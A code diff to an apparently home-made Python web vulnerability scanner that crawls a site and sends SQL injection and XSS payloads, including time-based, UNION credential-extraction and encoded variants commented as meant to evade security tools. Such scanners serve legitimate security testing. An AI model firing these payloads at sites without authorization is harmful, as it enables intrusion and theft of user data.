@@ -1,7 +1,8 @@
 import requests
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse
-import asyncio
+from urllib.parse import urljoin, urlparse, quote_plus, quote
+import base64
+import time
 
 async def crawl_website(url):
     """
@@ -65,29 +66,42 @@ async def crawl_website(url):
                 absolute_link = urljoin(current_url, link['href'])
                 await crawl(absolute_link)
 
-            # Check for common vulnerabilities
-            if check_sql_injection(current_url):
-                vulnerabilities["SQL Injection"].append(current_url)
-                print(f"SQL Injection vulnerability found at: {current_url}") 
+            # Check for SQL Injection vulnerabilities
+            sqli_result = check_sql_injection(current_url)
+            if sqli_result['vulnerability'] == "SQL Injection":
+                vulnerabilities["SQL Injection"].append({
+                    "url": sqli_result['test_url'],
+                    "payload": sqli_result['payload'],
+                    "error_pattern": sqli_result.get('error_pattern', 'None')
+                })
+                print(f"+ SQL Injection vulnerability found at: {sqli_result['test_url']} with payload: {sqli_result['payload']}")
 
-            if check_xss(current_url):
-                vulnerabilities["Cross-Site Scripting (XSS)"].append(current_url)
-                print(f"XSS vulnerability found at: {current_url}")
+
+            xss_result = check_xss(current_url)
+            if xss_result["vulnerabilities"]:
+                for vuln in xss_result["vulnerabilities"]:
+                    vulnerabilities["Cross-Site Scripting (XSS)"].append({
+                        "url": vuln["url"],
+                        "payload": vuln["payload"],
+                        "response_excerpt": vuln.get("response_excerpt", 'None')
+                    })
+                    print(f"+ XSS vulnerability found at: {vuln['url']} with payload: {vuln['payload']}")
+
             if check_idor(current_url):
                 vulnerabilities["Insecure Direct Object Reference (IDOR)"].append(current_url)
-                print(f"IDOR vulnerability found at: {current_url}")
+                print(f"+ IDOR vulnerability found at: {current_url}")
 
             if check_csrf(current_url):
                 vulnerabilities["Cross-Site Request Forgery (CSRF)"].append(current_url)
-                print(f"CSRF vulnerability found at: {current_url}")
+                print(f"+ CSRF vulnerability found at: {current_url}")
 
             if check_security_misconfiguration(current_url):
                 vulnerabilities["Security Misconfiguration"].append(current_url)
-                print(f"Security Misconfiguration found at: {current_url}")
+                print(f"+ Security Misconfiguration found at: {current_url}")
 
             if check_sensitive_data_exposure(current_url):
                 vulnerabilities["Sensitive Data Exposure"].append(current_url)
-                print(f"Sensitive Data Exposure found at: {current_url}")
+                print(f"+ Sensitive Data Exposure found at: {current_url}")
 
         except Exception as e:
             print(f"Error crawling {current_url}: {e}")
@@ -162,49 +176,178 @@ def is_same_domain(base_url, current_url):
     current_domain = urlparse(current_url).netloc
     return current_domain == base_domain or current_domain.startswith(f"www.{base_domain}")
 
+def encode_base64(payload):
+    # Encode a payload to Base64
+    # Avoid detection by basic security tools
+    return base64.b64encode(payload.encode()).decode()
+
+
 def check_sql_injection(url):
-    # List of common SQL injection payloads
+    # Payloads comunes de SQLi con variantes ofuscadas, codificadas y comentadas
     sql_payloads = [
-        "' OR '1'='1",
-        #"'; DROP TABLE users; --",
-        #'" OR "1"="1" --',
-        "' UNION SELECT username, password FROM users --"
+        "' OR '1'='1",  # Basic SQLi
+        "' OR '1'='1' --",  # Inline comment SQLi
+        "' OR '1'='1' /* comment */",  # Block comment SQLi
+        "' OR sleep(5) --",  # Blind SQLi de tiempo
+        "' UNION SELECT 1,2,3 --",  # Basic UNION SELECT
+        "' UNION SELECT NULL,NULL,NULL --",  # Union con valores NULL
+        "' UNION SELECT username,password FROM users --",  # Intento de extracción de datos
+        "'||(SELECT 1 FROM DUAL)--",  # Oracle DB payload
+        "' OR 'a'='a' /* test */",  # Ofuscación con comentarios
+        
+        # Payloads codificados en Base64
+        encode_base64("' OR '1'='1'"),
+        encode_base64("' OR sleep(5) --"),
+
+        # Payloads codificados en URL (y doblemente codificados)
+        quote_plus("' OR '1'='1'"),
+        quote_plus("' OR sleep(5) --"),
+        quote_plus(quote_plus("' OR '1'='1'")),
+        
+        # Payload ofuscado con comentarios divididos
+        "'/**/OR/**/'1'/**/='1'/* test */",
+        "' OR '1'/**/='1'/*comment*/--",
+        
+        # Codificado en Base64 + URL Encoding
+        quote_plus(encode_base64("' OR '1'='1'")),
+        quote_plus(encode_base64("' OR sleep(5) --"))
+    ]
+
+    # Patrones de error comunes en diferentes motores de base de datos
+    error_patterns = [
+        "syntax error",  # Error SQL genérico
+        "mysql",  # MySQL
+        "sql syntax",  # SQL genérico
+        "warning: pg_",  # PostgreSQL
+        "error in your sql",  # MySQL
+        "unrecognized token",  # SQLite
+        "odbc sql",  # ODBC
+        "oracle error",  # Oracle
+        "not a valid mysql",  # MySQL específico
+        "ORA-",  # Errores Oracle
+        "warning",  # Advertencias
+        "sql server",  # Microsoft SQL Server
+        "invalid sql statement"  # SQL inválido
     ]
 
     for payload in sql_payloads:
-        test_url = f"{url}?param={payload}"
-        print(f"Testing SQL Injection with payload: {payload} on {test_url}") 
-        try:
-            response = requests.get(test_url)
-            if "error" in response.text.lower() or "mysql" in response.text.lower():
-                print(f"Potential SQL Injection vulnerability detected at: {url}") 
-                return True
-        except requests.RequestException as e:
-            print(f"Error checking SQL injection: {e}")
-    
-    return False
+        # Se generan múltiples variantes del URL de prueba
+        test_urls = [
+            f"{url}?param={payload}",  # Prueba en un solo parámetro
+            f"{url}?id=1&name={payload}",  # Prueba en otro parámetro
+            f"{url}/{payload}",  # Prueba inyectando directamente en la URL
+            f"{url}?param={payload}#fragment",  # Prueba en un fragmento de URL
+        ]
+
+        for test_url in test_urls:
+            print(f"Testing SQL Injection with payload: {payload} on {test_url}")
+            try:
+                start_time = time.time()
+                response = requests.get(test_url)
+                response_time = time.time() - start_time
+
+                # Verifica si el tiempo de respuesta es inusualmente largo (Blind SQLi de tiempo)
+                if response_time > 5:
+                    print(f"Possible Blind SQL Injection detected by response delay at: {test_url}")
+                    return {"vulnerability": "SQL Injection", "payload": payload, "test_url": test_url}
+
+                # Busca errores específicos de bases de datos en el contenido de la respuesta
+                for pattern in error_patterns:
+                    if pattern in response.text.lower():
+                        print(f"Potential SQL Injection vulnerability detected at: {test_url} due to error pattern: {pattern}")
+                        return {"vulnerability": "SQL Injection", "payload": payload, "test_url": test_url, "error_pattern": pattern}
+                
+                # Chequeo adicional para respuestas atípicas
+                if "error" in response.text.lower() or "unexpected" in response.text.lower():
+                    print(f"Potential SQL Injection vulnerability detected at: {test_url} due to generic error.")
+                    return {"vulnerability": "SQL Injection", "payload": payload, "test_url": test_url, "error_pattern": "Generic error (Error/Unexpected)"}
+
+            except requests.RequestException as e:
+                print(f"Error checking SQL injection: {e}")
+
+    return {"vulnerability": "None", "message": "No SQL Injection detected."}
+
 
 def check_xss(url):
+    """
+    This function tests for potential XSS vulnerabilities by sending multiple variations of common XSS payloads
+    in an encoded and obfuscated format. It only tests for PoC without altering data.
+    
+    :param url: The URL to test for XSS
+    :return: A dictionary with information on potential XSS vulnerabilities detected
+    """
     # List of common XSS payloads
     xss_payloads = [
         "<script>alert('XSS')</script>",
         "<img src=x onerror=alert('XSS')>",
         "<svg/onload=alert('XSS')>",
-        "<iframe src='javascript:alert(1)'></iframe>"
+        "<iframe src='javascript:alert(1)'></iframe>",
+        "'\"><script>alert('XSS')</script>",  # Breaking out of attributes or contexts
     ]
-
+    
+    # Obfuscated payloads using Base64 encoding and URL encoding
+    obfuscated_payloads = []
     for payload in xss_payloads:
+        # Base64 encoding of payloads
+        base64_payload = base64.b64encode(payload.encode()).decode()
+        obfuscated_payloads.append(f"data:text/html;base64,{base64_payload}")
+
+        # URL encoding
+        url_encoded_payload = quote(payload)
+        obfuscated_payloads.append(url_encoded_payload)
+
+        # Hex encoding (character by character)
+        hex_payload = ''.join([f"%{hex(ord(c))[2:]}" for c in payload])
+        obfuscated_payloads.append(hex_payload)
+
+    all_payloads = xss_payloads + obfuscated_payloads
+
+    # Storage of results
+    vulnerabilities = []
+
+    for payload in all_payloads:
         test_url = f"{url}?param={payload}"
-        print(f"Testing XSS with payload: {payload} on {test_url}") 
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
+        }
+        print(f"Testing XSS with payload: {payload} on {test_url}")
+        
         try:
-            response = requests.get(test_url)
+            response = requests.get(test_url, headers=headers)
+            
+            # Basic check if the payload is reflected in the response (vulnerability indication)
             if payload in response.text:
-                print(f"Potential XSS vulnerability detected at: {url}") 
-                return True
+                # Further checks to ensure the payload is executed or reflected in a script tag
+                if any(tag in response.text for tag in ['<script>', 'onerror=', 'onload=', 'javascript:']):
+                    print(f"Potential XSS vulnerability detected at: {test_url}")
+                    vulnerabilities.append({
+                        "url": test_url,
+                        "payload": payload,
+                        "response_excerpt": response.text[:500]  # First 500 characters for context
+                    })
+            
+            # Alternative tests using POST requests (JSON input)
+            post_test_payload = {'param': payload}
+            post_response = requests.post(url, json=post_test_payload, headers={'Content-Type': 'application/json'})
+            
+            if payload in post_response.text:
+                print(f"Potential XSS vulnerability in POST request at: {url} with payload: {payload}")
+                vulnerabilities.append({
+                    "url": url,
+                    "payload": payload,
+                    "method": "POST",
+                    "response_excerpt": post_response.text[:500]  # First 500 characters for context
+                })
+        
         except requests.RequestException as e:
             print(f"Error checking XSS: {e}")
 
-    return False
+    # Return the found vulnerabilities
+    return {
+        "vulnerabilities": vulnerabilities,
+        "test_payloads": all_payloads
+    }
 
 def check_idor(url):
     # This is a very basic check for IDOR
